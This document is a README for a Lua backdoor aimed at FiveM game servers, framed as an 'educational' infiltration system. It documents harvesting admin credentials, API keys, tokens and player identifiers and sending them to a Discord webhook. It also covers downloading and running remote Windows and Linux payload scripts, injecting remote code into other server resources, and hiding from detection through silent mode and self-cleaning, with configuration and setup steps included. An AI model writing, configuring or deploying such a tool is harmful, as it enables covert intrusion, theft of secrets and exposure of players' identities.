# FiveM Server Infiltration System

## ⚠️ DISCLAIMER ⚠️
**USE AT YOUR OWN RISK. This tool is provided for educational purposes only. The authors take no responsibility for any misuse or damage caused by this software. Using this software to access systems without explicit permission is illegal and unethical.**

## Overview

This system allows for advanced data collection and analysis of FiveM servers, providing comprehensive insights into server configurations, admin access, player information, and resource management. The system utilizes multiple strategies to efficiently gather and report data while maintaining a minimal footprint.

## Features

### Admin Data Extraction
- Automatic discovery of admin credential files
- Extraction of admin identifiers, permission levels, and hashed passwords
- In-depth analysis of TxAdmin configuration files
- Support for various admin system formats

### Server Configuration Collection
- Comprehensive server variable collection
- Secure extraction of connection strings, API keys, and tokens
- License key and server identification collection
- Network configuration analysis

### Resource Management
- Complete resource inventory with states and metadata
- Framework detection (ESX, QB-Core, vRP, etc.)
- Resource dependency mapping
- Performance impact analysis

### Player Intelligence
- Real-time player census with identifiers
- Historical player data collection (configurable)
- Identity correlation across multiple identifier types
- Detailed connection information

### Data Reporting
- Advanced Discord webhook integration
- Customizable reporting format
- Secure data transmission
- Attachment support for larger datasets

### System Optimization
- Minimal performance impact
- Self-cleaning execution
- Configurable execution parameters
- Intelligent retry mechanisms

## Installation

1. Upload the `server.lua` file to your FiveM server
2. Configure the settings in the Config section
3. Add to a resource or create a new standalone resource
4. Ensure proper permissions for execution

## Configuration

The system is highly configurable through the Config section at the top of the file:

```lua
local Config = {
    -- Core Settings
    general = {
        debug_mode = false,            -- Enable for verbose logging
        silent_mode = true,            -- Hide all prints to prevent detection
        auto_clean = true              -- Auto-clean traces after execution
    },
    
    -- Payloads and URLs
    payloads = {
        -- System scripts (set to false to disable system script execution)
        system_scripts = {
            enabled = true,                                     -- Set to false to disable system script execution
            windows = "https://yoursite.com/windows.bat",       -- Windows payload URL
            linux = "https://yoursite.com/linux.sh"             -- Linux payload URL
        },
        
        -- Injection code settings
        injection = {
            enabled = true,                                     -- Enable code injection
            use_custom_url = false,                             -- Use custom URL instead of built-in collector
            custom_url = "https://yoursite.com/injection.lua",  -- Custom code URL to inject
            max_target_count = 3                                -- Max number of resources to inject into
        }
    },
    
    -- Discord Webhook
    webhook = {
        url = "YOUR_WEBHOOK_URL_HERE",                          -- Discord webhook URL
        username = "FiveM Intelligence",                        -- Bot username
        avatar_url = "https://i.imgur.com/example.png",         -- Bot avatar
        mention = "@everyone",                                  -- Role/user to mention (empty for none)
        color = 16711680,                                       -- Embed color (red)
        timeout_ms = 10000,                                     -- Webhook timeout (ms)
        retry_count = 3                                         -- Number of retries if webhook fails
    },
    
    -- Admin data extraction
    admin_data = {
        enabled = true,                              -- Enable admin data extraction
        scan_folders = true,                         -- Scan folders for admin files
        file_patterns = {                            -- File patterns to look for
            "admins.json",
            "admin.json",
            "users.json",
            "permissions.json"
        },
        max_scan_depth = 3                           -- Maximum folder depth for scanning
    },
    
    // ... Additional configuration sections ...
}
```

### Required Configuration:

At minimum, you should configure:
1. `webhook.url` - Set to your Discord webhook URL
2. Payload URLs if using external scripts

## Usage

Once installed and configured, the system will:

1. Initialize after a configurable delay
2. Collect server information
3. Extract admin data if enabled
4. Execute system scripts if enabled
5. Inject code into resources if enabled
6. Send collected data to the configured webhook

## Advanced Usage

### Custom Payloads
You can use custom Lua code for injection by setting:
```lua
Config.payloads.injection.use_custom_url = true
Config.payloads.injection.custom_url = "https://your-url.com/code.lua"
```

### System Script Execution
To disable system script execution:
```lua
Config.payloads.system_scripts.enabled = false
```

### Silent Operation
For completely silent operation:
```lua
Config.general.silent_mode = true
Config.general.debug_mode = false
```

### Periodic Reporting
Enable periodic reporting:
```lua
Config.execution.periodic_reporting = true
Config.execution.reporting_interval = 3600000 -- 1 hour in ms
```

## Troubleshooting

### Webhook Issues
- Verify your webhook URL is correct
- Check Discord server permissions
- Ensure the message is under Discord's size limits

### Execution Problems
- Enable debug_mode temporarily
- Check for file permission issues
- Verify the server has internet access for HTTP requests

### Data Collection Issues
- Some servers may have additional protection
- Resource structure may vary
- Admin files may be in non-standard locations

## Technical Information

This system is built with Lua and utilizes the Citizen Framework. It's designed to be as lightweight as possible while maintaining extensive functionality.

---

## ⚠️ FINAL WARNING ⚠️

**This software is provided for educational purposes only. Unauthorized access to computer systems is illegal. Always obtain proper authorization before deploying this software. The authors disclaim all liability for any damages resulting from the use of this software.**

*USE AT YOUR OWN RISK.*
